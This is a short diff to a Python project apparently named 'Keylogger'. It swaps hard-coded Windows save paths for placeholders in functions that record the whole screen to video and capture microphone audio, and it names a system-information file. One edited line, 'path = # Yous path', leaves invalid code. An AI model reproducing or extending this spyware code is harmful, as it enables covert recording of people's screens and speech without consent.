@@ -13,7 +13,7 @@ import cv2
 import logging
 
 image = "screenshot"
-path = "D:\Projects\Keylogger\python"
+path = # Yous path
 system_information = "system.txt"
 timer = 30
 count = 0
@@ -57,7 +57,7 @@ def screen_recorder():
     width = GetSystemMetrics(0) # 0 for getting the width
     height = GetSystemMetrics(1) 
     time_stamp = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')
-    sc = f'D:\Projects\Keylogger\python\{time_stamp}.mp4'    
+    sc = f'D:\{time_stamp}.mp4'    # mention any desired path with the extention
     fourcc = cv2.VideoWriter_fourcc(*"mp4v")
     fps = 150
     captured_video = cv2.VideoWriter(sc,fourcc,fps,(width,height))
@@ -82,7 +82,7 @@ def microphone():
         frme_rate = 44100 # default 48000
         duration = 20
         time_stamp = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')
-        sr = f'D:\Projects\Keylogger\python\{time_stamp}.wav'
+        sr = f'D:\{time_stamp}.wav' # mention any desired path with the extention
         print("Recording started....")
         recording = sounddevice.rec(int(duration*frme_rate),samplerate=frme_rate,channels=2)
         sounddevice.wait()
